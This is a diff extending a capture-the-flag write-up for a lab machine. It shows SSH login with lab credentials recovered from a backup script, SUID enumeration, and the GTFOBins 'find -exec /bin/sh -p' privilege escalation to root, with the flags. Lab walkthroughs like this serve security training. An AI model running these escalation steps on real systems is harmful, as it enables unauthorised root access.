@@ -12,6 +12,7 @@ PORT      STATE SERVICE
 21/tcp    open  ftp
 80/tcp    open  http
 10000/tcp open  snet-sensor-mgmt
+55007/tcp open  unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 6.55 seconds
 
@@ -211,3 +212,79 @@ Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
 ```
 
 AYYY-OOO! We got some credentials! `basterd:superduperp@$$`
+
+ssh -p 55007 basterd@10.10.191.22
+
+cat backup.sh
+```
+USER=stoner
+#superduperp@$$no1knows
+```
+
+`stoner:superduperp@$$no1knows`
+
+```
+stoner@Vulnerable:~$ cat .secret
+You made it till here, well done.
+```
+
+user.txt flag -> `You made it till here, well done.`
+
+lets privesc
+```
+stoner@Vulnerable:/$ sudo -l
+User stoner may run the following commands on Vulnerable:
+    (root) NOPASSWD: /NotThisTime/MessinWithYa
+```
+Hmm, messing with us again. 
+
+Lets check for setuid permissions then...
+```
+stoner@Vulnerable:/$ find / -user root -perm -4000 -exec ls -ldb {} \;
+-rwsr-xr-x 1 root root 38900 Mar 26  2019 /bin/su
+-rwsr-xr-x 1 root root 30112 Jul 12  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 26492 May 15  2019 /bin/umount
+-rwsr-xr-x 1 root root 34812 May 15  2019 /bin/mount
+-rwsr-xr-x 1 root root 43316 May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 38932 May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 13960 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-custom
+-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-pristine
+-rwsr-xr-- 1 root messagebus 46436 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 513528 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newgidmap
+-r-sr-xr-x 1 root root 232196 Feb  8  2016 /usr/bin/find
+-rwsr-xr-x 1 root root 39560 Mar 26  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root root 74280 Mar 26  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root root 53128 Mar 26  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root root 34680 Mar 26  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 159852 Jun 11  2019 /usr/bin/sudo
+-rwsr-xr-x 1 root root 18216 Mar 27  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 78012 Mar 26  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newuidmap
+find: ‘/proc/2132/task/2132/fd/6’: No such file or directory
+find: ‘/proc/2132/task/2132/fdinfo/6’: No such file or directory
+find: ‘/proc/2132/fd/5’: No such file or directory
+find: ‘/proc/2132/fdinfo/5’: No such file or directory
+```
+
+Looking at GTFObins gives this command to exploit `find`
+`./find . -exec /bin/sh -p \; -quit` drop the `./` from find and run the command to get root.
+
+```
+stoner@Vulnerable:/$ ./find . -exec /bin/sh -p \; -quit
+-bash: ./find: No such file or directory
+stoner@Vulnerable:/$ find . -exec /bin/sh -p \; -quit
+# whoami
+root
+```
+
+go to /root and cat the flag
+```
+# cat root.txt
+It wasn't that hard, was it?
+
+```
+
+yes...yes it was.
